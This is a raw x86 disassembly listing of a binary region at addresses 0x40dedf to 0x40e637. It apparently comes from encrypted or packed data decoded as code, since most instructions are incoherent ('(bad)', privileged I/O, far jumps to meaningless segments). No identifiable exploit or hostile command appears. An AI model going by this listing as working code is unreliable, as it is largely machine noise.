  40dedf:	rcl    DWORD PTR [eax-0x307231ba],0x40
  40dee6:	aam    0xde
  40dee8:	sbb    BYTE PTR ds:0x589707f6,bh
  40deee:	outs   dx,BYTE PTR ds:[esi]
  40deef:	cmp    DWORD PTR [edi+0x13b42fc5],esi
  40def5:	fisubr DWORD PTR [ecx+0x2]
  40def8:	mov    ebp,0x4148edf3
  40defd:	jl     0x40df7d
  40deff:	sub    ch,ah
  40df01:	xchg   ebx,eax
  40df02:	fbstp  TBYTE PTR [ecx+0x3f]
  40df05:	mov    edi,ebx
  40df07:	inc    edx
  40df08:	lahf   
  40df09:	ss jbe 0x40df64
  40df0c:	cli    
  40df0d:	popf   
  40df0e:	(bad)  
  40df0f:	not    BYTE PTR [ecx]
  40df11:	xor    eax,0x9af21024
  40df16:	aad    0x93
  40df18:	ja     0x40df95
  40df1a:	(bad)  
  40df1b:	cld    
  40df1c:	cwde   
  40df1d:	in     al,0x6f
  40df1f:	cwde   
  40df20:	push   ebp
  40df21:	test   eax,0xf4a00d48
  40df26:	cld    
  40df27:	xchg   ecx,eax
  40df28:	clc    
  40df29:	ins    BYTE PTR es:[edi],dx
  40df2a:	int    0xba
  40df2c:	out    0x77,al
  40df2e:	pushf  
  40df2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df30:	imul   edi,DWORD PTR [ebx],0xffffffe2
  40df33:	inc    ebx
  40df34:	dec    edx
  40df35:	clc    
  40df36:	jb     0x40dec3
  40df38:	jg     0x40df6d
  40df3a:	and    al,0xca
  40df3d:	std    
  40df3e:	shl    DWORD PTR [ebp+ecx*1+0x2a],cl
  40df42:	mov    ecx,0xaac73d08
  40df47:	pop    ebx
  40df48:	cs out dx,eax
  40df4a:	into   
  40df4b:	mov    ch,0x8f
  40df4d:	xchg   cx,ax
  40df4f:	pop    edi
  40df50:	fimul  DWORD PTR [edx+0x4b]
  40df53:	mov    edx,0x8b70fc2a
  40df58:	xor    al,0xab
  40df5a:	and    al,0x37
  40df5c:	test   DWORD PTR [eax],edx
  40df5e:	sbb    al,0xc2
  40df60:	xchg   edi,eax
  40df61:	inc    esp
  40df62:	pop    eax
  40df63:	dec    eax
  40df64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df65:	pop    edi
  40df66:	arpl   si,cx
  40df68:	add    eax,0xab523513
  40df6d:	sub    al,0x48
  40df6f:	add    eax,0xd8f2ac01
  40df74:	stos   BYTE PTR es:[edi],al
  40df75:	xlat   BYTE PTR ds:[ebx]
  40df76:	sbb    BYTE PTR [esi-0x562c80d],ah
  40df7c:	sbb    BYTE PTR [eax+edi*2],dh
  40df7f:	(bad)  
  40df80:	sub    al,0x58
  40df82:	sub    al,0x15
  40df84:	addr16 dec ecx
  40df86:	cmp    DWORD PTR [ecx],eax
  40df88:	pop    ebx
  40df89:	cvtpi2ps xmm0,mm6
  40df8c:	sub    ecx,eax
  40df8e:	mov    cl,0x89
  40df90:	sbb    al,0xcb
  40df92:	jo     0x40df65
  40df94:	jmp    0x40e012
  40df96:	adc    eax,0x8fd290f1
  40df9b:	js     0x40e002
  40df9d:	arpl   WORD PTR [ecx-0x7f],bp
  40dfa0:	cmc    
  40dfa1:	xor    eax,ecx
  40dfa3:	push   es
  40dfa4:	addr16 add cl,dl
  40dfa7:	jno    0x40df62
  40dfa9:	stc    
  40dfaa:	and    eax,0x4c707471
  40dfaf:	push   ecx
  40dfb0:	lock ret 
  40dfb2:	mov    dh,0xb2
  40dfb4:	mov    DWORD PTR [edi+0x38],eax
  40dfb7:	mov    ds:0x10412bf5,eax
  40dfbc:	ins    DWORD PTR es:[edi],dx
  40dfbd:	in     eax,0xb0
  40dfbf:	fs (bad) 
  40dfc1:	xor    edi,DWORD PTR [ecx-0x5a]
  40dfc4:	out    dx,al
  40dfc5:	and    ch,BYTE PTR [ebp-0x34]
  40dfc8:	jle    0x40dfbe
  40dfca:	sar    DWORD PTR [ecx],cl
  40dfcc:	fidiv  DWORD PTR [ecx+0x15]
  40dfcf:	(bad)  
  40dfd0:	hlt    
  40dfd1:	adc    al,0x43
  40dfd3:	jg     0x40e03c
  40dfd5:	pop    esi
  40dfd6:	mov    ebx,0x795d69a1
  40dfdb:	push   0xfffffffd
  40dfdd:	and    DWORD PTR [esi+0x4186a3e9],ecx
  40dfe3:	pop    esi
  40dfe4:	in     al,0x6f
  40dfe6:	sub    al,0x3
  40dfe8:	pop    esi
  40dfe9:	repnz dec ecx
  40dfeb:	ds cdq 
  40dfed:	xchg   ebx,eax
  40dfee:	push   cs
  40dfef:	hlt    
  40dff0:	mov    ds:0x17d3897b,al
  40dff5:	out    0x48,eax
  40dff7:	mov    eax,ds:0xf2332ae9
  40dffc:	mov    edi,0x9518b0ee
  40e001:	call   0x3328:0x6e220bb7
  40e008:	out    dx,al
  40e009:	sub    bl,bl
  40e00b:	pop    esp
  40e00c:	mov    eax,0xbdc9085b
  40e011:	pop    ebp
  40e012:	push   0x7b
  40e014:	or     ecx,edx
  40e016:	pop    ss
  40e017:	adc    DWORD PTR [esi-0x20140bee],esi
  40e01d:	ss xchg DWORD PTR ds:[edx],esp
  40e021:	and    BYTE PTR [ebp-0x53],0xb1
  40e025:	(bad)  
  40e027:	inc    edi
  40e028:	sbb    BYTE PTR [ebp+0x6a0dc863],0xf8
  40e02f:	popa   
  40e030:	pop    ebp
  40e031:	fistp  QWORD PTR [ebp+eiz*8+0x2dfd30f6]
  40e038:	adc    BYTE PTR [ecx-0x61],0xc8
  40e03c:	xchg   edx,eax
  40e03d:	sbb    DWORD PTR fs:[ebx-0x52ae90b5],eax
  40e044:	lahf   
  40e045:	pop    ds
  40e046:	xchg   esi,eax
  40e047:	push   esp
  40e048:	jo     0x40e007
  40e04a:	(bad)  
  40e04b:	sub    al,0x5a
  40e04d:	div    BYTE PTR [ecx-0x36f5a62c]
  40e053:	ds repz push ebx
  40e056:	scas   eax,DWORD PTR es:[edi]
  40e057:	ret    0xc5ef
  40e05a:	and    BYTE PTR [eax+0x66],ah
  40e05d:	pusha  
  40e05e:	out    dx,al
  40e05f:	or     eax,0x5b599f0b
  40e064:	mov    esp,0x6f9599af
  40e069:	mov    dl,0x63
  40e06b:	scas   eax,DWORD PTR es:[edi]
  40e06c:	iret   
  40e06d:	ja     0x40dff1
  40e06f:	hlt    
  40e070:	in     eax,0xca
  40e072:	cs in  al,dx
  40e074:	mov    ds:0x985a6e25,al
  40e079:	xchg   ecx,eax
  40e07a:	mov    ds:0x7b82200a,al
  40e07f:	loope  0x40e07a
  40e081:	push   cs
  40e082:	inc    esi
  40e083:	int3   
  40e084:	jl     0x40e0d9
  40e086:	push   0x6fae6b76
  40e08b:	jns    0x40e07d
  40e08d:	ss jle 0x40e08b
  40e090:	fdiv   QWORD PTR es:[esi]
  40e093:	push   edi
  40e094:	adc    bh,dl
  40e096:	pop    edx
  40e097:	push   ebx
  40e098:	iret   
  40e099:	or     dh,dl
  40e09b:	push   edi
  40e09c:	cmp    al,0xa5
  40e09e:	adc    cl,cl
  40e0a0:	fs pop ds
  40e0a2:	stos   BYTE PTR es:[edi],al
  40e0a3:	in     eax,dx
  40e0a4:	xchg   edx,eax
  40e0a5:	cwde   
  40e0a6:	icebp  
  40e0a7:	repnz ror BYTE PTR [ebx-0x15],1
  40e0ab:	shl    DWORD PTR [ebx+0x5676f13f],0x4c
  40e0b2:	jmp    0x40e112
  40e0b4:	rol    ebx,0x48
  40e0b7:	inc    edi
  40e0b8:	es pushf 
  40e0ba:	out    0x74,al
  40e0bc:	hlt    
  40e0bd:	(bad)  
  40e0be:	xor    ebp,DWORD PTR [edi]
  40e0c0:	(bad)  
  40e0c1:	retf   0xd401
  40e0c4:	inc    ebp
  40e0c5:	int    0x1d
  40e0c7:	inc    esp
  40e0c8:	data16 icebp 
  40e0ca:	outs   dx,DWORD PTR ds:[esi]
  40e0cb:	lahf   
  40e0cc:	clc    
  40e0cd:	sbb    edi,ecx
  40e0cf:	xor    ebx,esi
  40e0d1:	mov    edx,DWORD PTR [edx-0x62]
  40e0d4:	shl    esp,cl
  40e0d6:	(bad)  
  40e0d7:	cli    
  40e0d8:	fst    DWORD PTR [esi+0x36]
  40e0db:	in     al,dx
  40e0dc:	test   BYTE PTR [ecx+0x644d9a11],dl
  40e0e2:	or     BYTE PTR [esi-0x5f],al
  40e0e5:	pushf  
  40e0e6:	jb     0x40e118
  40e0e8:	scas   al,BYTE PTR es:[edi]
  40e0e9:	inc    esp
  40e0ea:	aam    0xe2
  40e0ec:	adc    ebx,ebp
  40e0ee:	call   0x6bb53382
  40e0f3:	push   ss
  40e0f4:	and    ch,ch
  40e0f6:	push   DWORD PTR [eax+edi*1]
  40e0f9:	lahf   
  40e0fa:	or     cl,BYTE PTR [esi-0x1722ad04]
  40e100:	sbb    DWORD PTR [eax+0x40],ebx
  40e103:	mov    ah,BYTE PTR [eax]
  40e105:	ja     0x40e117
  40e107:	push   ebx
  40e108:	pop    edx
  40e109:	or     eax,0x209e401e
  40e10e:	push   0xa213d590
  40e113:	xor    DWORD PTR [ecx+0x63],edi
  40e116:	pop    edx
  40e117:	or     DWORD PTR [edi],eax
  40e119:	mov    WORD PTR [eax],cs
  40e11b:	xchg   esp,eax
  40e11c:	repnz and eax,0x171e289b
  40e122:	xchg   ebp,eax
  40e123:	or     eax,0xde249ea6
  40e128:	in     eax,0x1d
  40e12a:	pop    esi
  40e12b:	xchg   edx,eax
  40e12c:	arpl   WORD PTR [ebx+0x13],bp
  40e12f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e131:	sbb    eax,0x67d1410f
  40e136:	pop    eax
  40e137:	add    ebx,0xfffffff0
  40e13a:	rcl    ebx,cl
  40e13c:	sahf   
  40e13d:	add    DWORD PTR [esi-0x5ea4b84e],0xfffffffc
  40e144:	lods   al,BYTE PTR ds:[esi]
  40e145:	stos   DWORD PTR es:[edi],eax
  40e146:	scas   eax,DWORD PTR es:[edi]
  40e147:	aam    0xa8
  40e149:	mov    esi,0x3385e46
  40e14e:	jo     0x40e0d0
  40e150:	add    DWORD PTR [ecx],ecx
  40e152:	mov    al,ds:0x2ff8515
  40e157:	loopne 0x40e102
  40e159:	mov    edx,0xf68e3671
  40e15e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e15f:	ficomp DWORD PTR [ebx]
  40e161:	int3   
  40e162:	dec    ecx
  40e163:	push   ebx
  40e164:	add    eax,0x4491d59
  40e169:	pop    ebp
  40e16a:	push   0xfb3d4469
  40e16f:	leave  
  40e170:	mov    ds:0x999369c2,eax
  40e175:	jmp    0x40e1f6
  40e177:	psadbw mm3,QWORD PTR [ebx]
  40e17a:	jb     0x40e13e
  40e17c:	cwde   
  40e17d:	add    al,0xdf
  40e180:	dec    edx
  40e181:	mov    bh,0xf5
  40e183:	loop   0x40e186
  40e185:	xchg   ecx,eax
  40e186:	dec    esi
  40e187:	std    
  40e188:	sbb    edx,DWORD PTR [eax-0x14026f53]
  40e18e:	push   0x76
  40e190:	xchg   ebx,eax
  40e191:	daa    
  40e192:	and    bl,0xbd
  40e195:	fbld   TBYTE PTR [ebp-0xe845ace]
  40e19b:	es clc 
  40e19d:	repnz loop 0x40e158
  40e1a0:	or     BYTE PTR [eax+0x1e79bdeb],al
  40e1a6:	inc    ecx
  40e1a7:	or     al,0x27
  40e1a9:	into   
  40e1aa:	xor    al,0xec
  40e1ac:	rcr    BYTE PTR [esi+0x13735447],0x9d
  40e1b3:	dec    ebx
  40e1b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1b5:	rol    DWORD PTR [edx-0x4f403e9f],1
  40e1bb:	outs   dx,BYTE PTR ds:[esi]
  40e1bc:	xchg   ecx,eax
  40e1bd:	aad    0xb6
  40e1bf:	test   DWORD PTR [ebp+0x439dbc4c],esp
  40e1c5:	stos   DWORD PTR es:[edi],eax
  40e1c6:	cmp    eax,0x1ffabf3f
  40e1cb:	jne    0x40e1bd
  40e1cd:	xchg   ebx,eax
  40e1ce:	arpl   WORD PTR [edx],si
  40e1d0:	add    DWORD PTR [esi-0x9e13b43],eax
  40e1d6:	jle    0x40e1c7
  40e1d8:	sti    
  40e1d9:	mov    ebp,0x3faa0dc9
  40e1de:	jmp    0x4e57:0x7ea55b87
  40e1e5:	daa    
  40e1e6:	nop
  40e1e7:	pop    es
  40e1e8:	xchg   DWORD PTR [eax+0x28baf968],esi
  40e1ee:	popf   
  40e1ef:	dec    edx
  40e1f0:	xchg   esi,eax
  40e1f1:	scas   al,BYTE PTR es:[edi]
  40e1f2:	adc    edx,ebp
  40e1f4:	inc    esi
  40e1f5:	into   
  40e1f6:	aam    0x3f
  40e1f8:	or     al,0xdf
  40e1fa:	mov    al,0x7d
  40e1fc:	test   al,0x1d
  40e1fe:	fistp  WORD PTR [edx-0x5599f109]
  40e204:	outs   dx,DWORD PTR ds:[esi]
  40e205:	scas   eax,DWORD PTR es:[edi]
  40e206:	scas   al,BYTE PTR es:[edi]
  40e207:	sti    
  40e208:	(bad)  
  40e209:	loopne 0x40e1e8
  40e20b:	cmp    eax,0x31bf9e0a
  40e210:	in     al,0x79
  40e212:	sahf   
  40e213:	call   0x3949e5e6
  40e218:	jecxz  0x40e213
  40e21a:	inc    eax
  40e21b:	fdivr  DWORD PTR [ecx-0x6c48c231]
  40e221:	into   
  40e222:	add    bh,BYTE PTR [eax+ebp*2+0x645e83eb]
  40e229:	or     al,0xd6
  40e22b:	jge    0x40e28a
  40e22d:	mov    WORD PTR [ecx-0x44],es
  40e230:	jo     0x40e295
  40e232:	mov    ds:0xb3c05e1,al
  40e237:	retf   
  40e238:	lock push 0x6a34e251
  40e23e:	xor    eax,DWORD PTR [esi]
  40e240:	test   BYTE PTR [ecx-0x11],ch
  40e243:	add    eax,0xf63d636b
  40e248:	dec    eax
  40e249:	clc    
  40e24a:	inc    esi
  40e24b:	xchg   ebp,eax
  40e24c:	cld    
  40e24d:	xor    DWORD PTR [ecx+eax*1],esi
  40e250:	lods   eax,DWORD PTR ds:[esi]
  40e251:	call   0xc4a6:0x9a8036a4
  40e258:	jmp    0x19ae491e
  40e25d:	push   ss
  40e25e:	mov    al,BYTE PTR [edi+0x5cfb7557]
  40e264:	jg     0x40e2a6
  40e266:	ret    
  40e267:	or     BYTE PTR [esi],dh
  40e269:	sub    ecx,DWORD PTR [edx+edx*8]
  40e26c:	fidiv  WORD PTR [eax]
  40e26e:	add    BYTE PTR [ebp+0x6b4045a9],0xa8
  40e275:	lods   al,BYTE PTR ds:[esi]
  40e276:	inc    eax
  40e277:	icebp  
  40e278:	sbb    eax,edi
  40e27a:	das    
  40e27b:	clc    
  40e27c:	imul   esi,DWORD PTR [edi+eiz*8],0x4e
  40e280:	dec    esi
  40e281:	dec    edi
  40e282:	push   ecx
  40e283:	pop    esp
  40e284:	loop   0x40e209
  40e286:	(bad)
  40e289:	ret    0xd85
  40e28c:	sbb    edx,0xc01aac73
  40e292:	cmc    
  40e293:	xchg   ebx,eax
  40e294:	retf   
  40e295:	aam    0xe0
  40e297:	sub    edi,edx
  40e299:	add    edi,DWORD PTR [ebp-0x10]
  40e29c:	mov    edx,DWORD PTR [ebp-0x20]
  40e29f:	mov    ebx,DWORD PTR [ebp-0x8]
  40e2a2:	xor    edx,eax
  40e2a4:	add    edx,ecx
  40e2a6:	imul   edx,ebx
  40e2a9:	cmp    edx,edi
  40e2ab:	jbe    0x40a4fb
  40e2b1:	pop    ebx
  40e2b2:	jmp    0x40e6c9
  40e2b7:	mov    BYTE PTR [edi+0x6af53ecb],bl
  40e2bd:	xchg   ebp,eax
  40e2be:	imul   esp,ecx,0x405e5ddc
  40e2c4:	adc    edi,ebp
  40e2c6:	loope  0x40e2f6
  40e2c8:	stos   BYTE PTR es:[edi],al
  40e2c9:	jle    0x40e349
  40e2cb:	jo     0x40e346
  40e2cd:	jle    0x40e34d
  40e2cf:	xchg   ebp,eax
  40e2d0:	stc    
  40e2d1:	mov    dl,cl
  40e2d3:	xchg   ecx,eax
  40e2d4:	or     DWORD PTR [esi+0x41],ecx
  40e2d7:	xchg   ebp,eax
  40e2d8:	mov    bl,0x2c
  40e2da:	jmp    0x40e280
  40e2dc:	push   esi
  40e2dd:	imul   ecx,DWORD PTR [ebx+0x3c],0x4
  40e2e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2e2:	jo     0x40e2e3
  40e2e4:	dec    edx
  40e2e5:	mov    edx,0xe58940cd
  40e2ea:	or     eax,0xea80469c
  40e2ef:	mov    esp,0xbea6d73e
  40e2f4:	pusha  
  40e2f5:	xor    eax,0xf2e1fcc9
  40e2fa:	js     0x40e368
  40e2fc:	or     al,0x60
  40e2fe:	dec    ebp
  40e2ff:	mov    edi,0x2e185976
  40e304:	pop    ecx
  40e305:	lds    edx,FWORD PTR [ebp-0x57756417]
  40e30b:	or     BYTE PTR [ecx-0x5a],bh
  40e30e:	ret    
  40e30f:	adc    bl,BYTE PTR [ecx]
  40e311:	sub    dl,BYTE PTR [ebp-0x600518c6]
  40e317:	icebp  
  40e318:	add    dl,bh
  40e31a:	mov    esp,0x90c47e5d
  40e31f:	dec    ebx
  40e320:	pop    ebp
  40e321:	sub    eax,0xb86bc12e
  40e326:	or     eax,DWORD PTR [ebx]
  40e328:	mov    bh,0x73
  40e32a:	sti    
  40e32b:	push   eax
  40e32c:	cmp    al,0x1e
  40e32e:	lods   eax,DWORD PTR ds:[esi]
  40e32f:	fst    st(7)
  40e331:	or     DWORD PTR [ecx-0x3bcd436],edi
  40e337:	frstor [eax]
  40e339:	outs   dx,DWORD PTR ds:[esi]
  40e33a:	gs jge 0x40e3b5
  40e33d:	mov    ch,0x93
  40e33f:	ret    
  40e340:	jecxz  0x40e3ae
  40e342:	jmp    0x8e55:0x666df6f6
  40e349:	jne    0x40e3c2
  40e34b:	sbb    al,bl
  40e34d:	mov    ch,0xd1
  40e34f:	iret   
  40e350:	loopne 0x40e322
  40e352:	jmp    0x34c77f22
  40e357:	(bad)  
  40e358:	jmp    0xbd99a3db
  40e35d:	into   
  40e35e:	mov    esp,0x6f657af2
  40e363:	ret    
  40e364:	test   DWORD PTR cs:[esi],edx
  40e367:	xchg   esi,eax
  40e368:	mov    dl,0xf2
  40e36a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e36b:	in     eax,0x4a
  40e36d:	nop
  40e36e:	adc    DWORD PTR [edx+0x42b6bb13],0x9
  40e375:	jge    0x40e318
  40e377:	arpl   WORD PTR [edx],bx
  40e379:	mov    eax,ds:0xc9ddd2c0
  40e37e:	out    0x5c,eax
  40e380:	ins    DWORD PTR es:[edi],dx
  40e381:	xor    eax,0x5284c0b3
  40e386:	and    DWORD PTR ds:0xfaf3b1d6,esi
  40e38c:	call   0x5816:0x59330c46
  40e393:	dec    esp
  40e394:	push   0xc4ebca39
  40e399:	and    al,0x58
  40e39b:	outs   dx,BYTE PTR ds:[esi]
  40e39c:	and    esi,DWORD PTR [esi+0x36f0436b]
  40e3a2:	bound  esp,QWORD PTR [ecx+0x72]
  40e3a5:	rcr    BYTE PTR [ecx-0x606d654e],1
  40e3ab:	fsubr  DWORD PTR [edi+0x2a]
  40e3ae:	inc    eax
  40e3af:	fild   QWORD PTR [eax]
  40e3b1:	inc    eax
  40e3b2:	xchg   esp,eax
  40e3b3:	or     BYTE PTR [esi],0x27
  40e3b6:	mov    ah,ah
  40e3b8:	xor    BYTE PTR [esi],bh
  40e3ba:	push   0x520aa88
  40e3bf:	stos   BYTE PTR es:[edi],al
  40e3c0:	ins    BYTE PTR es:[edi],dx
  40e3c1:	mov    eax,0x7abd0b37
  40e3c6:	cmp    ch,BYTE PTR [ebx+0x57]
  40e3c9:	ins    BYTE PTR es:[edi],dx
  40e3ca:	push   edx
  40e3cb:	cwde   
  40e3cc:	and    bl,BYTE PTR [ecx]
  40e3ce:	loopne 0x40e426
  40e3d0:	xor    eax,0xbfb0debf
  40e3d5:	jp     0x40e395
  40e3d7:	rcl    DWORD PTR [ebx+0x7d5a115e],0xd6
  40e3de:	in     eax,0x9d
  40e3e0:	push   0xffffffa6
  40e3e2:	jb     0x40e3a4
  40e3e4:	and    al,0xbe
  40e3e6:	int    0x4c
  40e3e8:	repz or BYTE PTR [esi-0x40564197],cl
  40e3ef:	mov    eax,ds:0x4715c12b
  40e3f4:	or     bl,0x8f
  40e3f7:	sbb    al,ch
  40e3f9:	dec    ebx
  40e3fa:	cmp    dl,dl
  40e3fc:	cld    
  40e3fd:	in     eax,dx
  40e3fe:	imul   esp,DWORD PTR fs:[eax+0x7b10dcec],0x63c800e3
  40e409:	inc    edi
  40e40a:	retf   0xe9de
  40e40d:	aaa    
  40e40e:	mov    esi,0xd3c03f8b
  40e413:	push   0xe7e1005c
  40e418:	shl    ebp,cl
  40e41a:	stos   DWORD PTR es:[edi],eax
  40e41b:	adc    BYTE PTR [ebp+0x4c],dl
  40e41e:	lahf   
  40e41f:	xchg   BYTE PTR [edx-0x4efc3cea],bl
  40e425:	jl     0x40e431
  40e427:	sbb    eax,DWORD PTR ds:[ebp-0x511dedc0]
  40e42e:	test   eax,0xa82cb6d1
  40e433:	and    ebp,eax
  40e435:	sub    BYTE PTR [esi-0x3ec19a54],al
  40e43b:	sbb    eax,0xa1239e97
  40e440:	cs ins BYTE PTR es:[edi],dx
  40e442:	not    BYTE PTR [ecx+0x4]
  40e445:	add    edx,ecx
  40e447:	add    al,0x73
  40e449:	inc    eax
  40e44a:	xchg   edi,eax
  40e44b:	cmp    DWORD PTR [ecx-0x7b],edx
  40e44e:	inc    edi
  40e44f:	xor    DWORD PTR [ebp+0x47],eax
  40e452:	sbb    eax,0x2557e7ce
  40e457:	add    al,0x48
  40e459:	mov    esi,0x8c5c7ad3
  40e45e:	sub    ch,dh
  40e460:	(bad)  [ebp-0x5497f5a6]
  40e466:	xacquire xchg BYTE PTR [edx],ah
  40e469:	xchg   esi,eax
  40e46a:	dec    esp
  40e46b:	jns    0x40e426
  40e46d:	sgdtd  [edx-0x5af68482]
  40e474:	stos   BYTE PTR es:[edi],al
  40e475:	retf   
  40e476:	es mov dl,0x92
  40e479:	aas    
  40e47a:	cmp    BYTE PTR [eax+0x4c],al
  40e47d:	sbb    eax,0xce70b513
  40e482:	ins    DWORD PTR es:[edi],dx
  40e483:	pop    ss
  40e484:	aad    0x99
  40e486:	icebp  
  40e487:	jae    0x40e47f
  40e489:	mov    ecx,0xbbf4f246
  40e48e:	push   ecx
  40e48f:	ja     0x40e4e0
  40e491:	stos   BYTE PTR es:[edi],al
  40e492:	xchg   edi,eax
  40e493:	das    
  40e494:	xchg   bh,dl
  40e496:	adc    esi,DWORD PTR [ecx-0xd]
  40e499:	mov    dh,0xec
  40e49b:	dec    esi
  40e49c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e49d:	mul    BYTE PTR [ecx]
  40e49f:	jne    0x40e4e6
  40e4a1:	icebp  
  40e4a2:	inc    esi
  40e4a3:	pop    eax
  40e4a4:	stc    
  40e4a5:	cmp    BYTE PTR [ebx-0x22],bl
  40e4a8:	bound  esp,QWORD PTR [ecx-0x2]
  40e4ab:	iret   
  40e4ac:	lahf   
  40e4ad:	outs   dx,BYTE PTR ds:[esi]
  40e4ae:	dec    edi
  40e4af:	popf   
  40e4b0:	pusha  
  40e4b1:	mov    al,ds:0x36c4bbbf
  40e4b6:	out    0x51,al
  40e4b8:	(bad)  
  40e4b9:	push   ebx
  40e4ba:	push   0x3a
  40e4bc:	sub    dh,BYTE PTR [esp+edi*2-0x1e]
  40e4c0:	pop    ebx
  40e4c1:	or     DWORD PTR [ebx],0x29
  40e4c4:	fs mov cl,0x12
  40e4c7:	xor    ebx,eax
  40e4c9:	outs   dx,DWORD PTR ds:[esi]
  40e4ca:	mov    ebp,0x594f686e
  40e4cf:	cli    
  40e4d0:	(bad)  
  40e4d1:	jns    0x40e523
  40e4d3:	jg     0x40e4cb
  40e4d5:	add    ecx,DWORD PTR [ebp+ebp*4-0x4]
  40e4d9:	jge    0x40e48e
  40e4db:	mov    al,ds:0x359eea08
  40e4e0:	inc    eax
  40e4e1:	or     eax,0x5e6a734a
  40e4e6:	scas   eax,DWORD PTR es:[edi]
  40e4e7:	inc    ecx
  40e4e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4e9:	gs mov ecx,0xd6f572ef
  40e4ef:	mov    edi,0x15be5db9
  40e4f4:	add    esp,DWORD PTR [edi-0x7d9ed291]
  40e4fa:	push   esi
  40e4fb:	dec    ebx
  40e4fc:	cmp    BYTE PTR [eax+0x5],bh
  40e4ff:	arpl   WORD PTR [edx+0x2e213050],si
  40e505:	mov    edx,0xe940244b
  40e50a:	aam    0xa5
  40e50c:	ins    BYTE PTR es:[edi],dx
  40e50d:	inc    eax
  40e50e:	test   DWORD PTR [ecx],esi
  40e510:	xor    ch,ch
  40e512:	dec    edx
  40e513:	xlat   BYTE PTR ds:[ebx]
  40e514:	dec    ebx
  40e515:	jne    0x40e4b8
  40e517:	jge    0x40e585
  40e519:	dec    esp
  40e51a:	arpl   WORD PTR [ecx-0x75],bx
  40e51d:	retf   0x3eb
  40e520:	cld    
  40e521:	push   ebp
  40e522:	push   0x14
  40e524:	add    dl,BYTE PTR [edi]
  40e526:	and    BYTE PTR [edx],dl
  40e528:	inc    edi
  40e529:	xor    bh,ah
  40e52b:	inc    edx
  40e52c:	cs adc esi,0x7700de69
  40e533:	dec    eax
  40e534:	lods   al,BYTE PTR ds:[esi]
  40e535:	lea    ecx,[ecx+0xe]
  40e538:	ins    BYTE PTR es:[edi],dx
  40e539:	gs mov edi,0x2b897bd5
  40e53f:	jmp    0x40e50b
  40e541:	pushf  
  40e542:	cld    
  40e543:	lahf   
  40e544:	stc    
  40e545:	add    esp,0x147f546f
  40e54b:	addr16 mov ebp,ebp
  40e54e:	push   ebx
  40e54f:	fidivr DWORD PTR [esi+0x61]
  40e552:	lods   al,BYTE PTR ds:[esi]
  40e553:	imul   BYTE PTR [eax+0x1bb96652]
  40e559:	out    0xcb,al
  40e55b:	jmp    0x40e5b4
  40e55d:	cli    
  40e55e:	outs   dx,DWORD PTR ds:[esi]
  40e55f:	pop    ss
  40e560:	xor    bl,ah
  40e562:	outs   dx,BYTE PTR ds:[esi]
  40e563:	lods   al,BYTE PTR ds:[esi]
  40e564:	icebp  
  40e565:	sub    dh,BYTE PTR [eax-0x6]
  40e568:	jns    0x40e5b4
  40e56a:	pop    ds
  40e56b:	fimul  WORD PTR [edi+0x33]
  40e56e:	push   es
  40e56f:	call   0x4d46d3d1
  40e574:	mov    cl,BYTE PTR [ebx+ebp*8]
  40e577:	scas   al,BYTE PTR es:[edi]
  40e578:	jno    0x40e5cf
  40e57a:	xchg   dh,bh
  40e57c:	imul   esp,DWORD PTR [eax-0x4d02119c],0x66716906
  40e586:	in     al,0xc3
  40e588:	popa   
  40e589:	adc    BYTE PTR [esi+0x5],ch
  40e58c:	rcr    BYTE PTR cs:[ebp-0x3a9bac2a],cl
  40e593:	aam    0xcd
  40e595:	xchg   ebx,eax
  40e596:	add    DWORD PTR [ebx-0x60],esp
  40e599:	sbb    bh,0x6c
  40e59c:	or     BYTE PTR [edi+0x22],0xd9
  40e5a0:	and    dl,cl
  40e5a2:	mov    edx,0x16dd0ea2
  40e5a7:	jmp    0x40e5e9
  40e5a9:	push   edx
  40e5aa:	adc    BYTE PTR [ecx+eax*2],bh
  40e5ad:	das    
  40e5ae:	pop    esp
  40e5af:	jo     0x40e570
  40e5b1:	jmp    0x40e585
  40e5b3:	sub    eax,0xaf2466f5
  40e5b8:	and    ebx,esp
  40e5ba:	adc    eax,0x27758f03
  40e5bf:	adc    ah,BYTE PTR [edx-0x4e]
  40e5c2:	push   es
  40e5c3:	adc    al,0xa8
  40e5c5:	pop    es
  40e5c6:	nop
  40e5c7:	pop    ecx
  40e5c8:	push   es
  40e5c9:	mul    BYTE PTR [edx-0x343a37e]
  40e5cf:	pop    edi
  40e5d0:	mov    edi,0x5ab7f47a
  40e5d5:	xor    al,0x39
  40e5d7:	mov    eax,ds:0x91fc7559
  40e5dc:	xchg   DWORD PTR [edi-0x38bbc94c],edx
  40e5e2:	aas    
  40e5e3:	xlat   BYTE PTR ds:[bx]
  40e5e5:	or     DWORD PTR [edi],edi
  40e5e7:	dec    ebp
  40e5e8:	cs adc bh,ah
  40e5eb:	popa   
  40e5ec:	jle    0x40e629
  40e5ee:	or     eax,DWORD PTR [esi-0x38]
  40e5f1:	loop   0x40e661
  40e5f3:	aam    0x7
  40e5f5:	aas    
  40e5f6:	inc    ecx
  40e5f7:	in     al,dx
  40e5f8:	cmp    al,0xb
  40e5fa:	hlt    
  40e5fb:	sub    BYTE PTR [ebx],dl
  40e5fd:	jg     0x40e5cc
  40e5ff:	mov    dl,0x34
  40e601:	cmp    al,0x82
  40e603:	jae    0x40e5d7
  40e605:	push   ds
  40e606:	and    al,0xc0
  40e608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e609:	fsub   QWORD PTR [edi]
  40e60b:	xchg   edi,eax
  40e60c:	mov    ch,0x87
  40e60e:	jmp    0xb90c:0xcb3c10d2
  40e615:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e616:	iret   
  40e617:	or     al,0x26
  40e619:	in     eax,dx
  40e61a:	adc    al,0xb9
  40e61c:	call   0x9ea4:0x212b26a8
  40e623:	adc    eax,0xfd17bfab
  40e628:	adc    eax,0xa54e48f7
  40e62d:	jno    0x40e648
  40e62f:	push   ebx
  40e630:	dec    ebp
  40e631:	sub    DWORD PTR [ecx+0xaa6391d],ebx
  40e637:	add    DWORD PTR [ebx+0x28],ebx
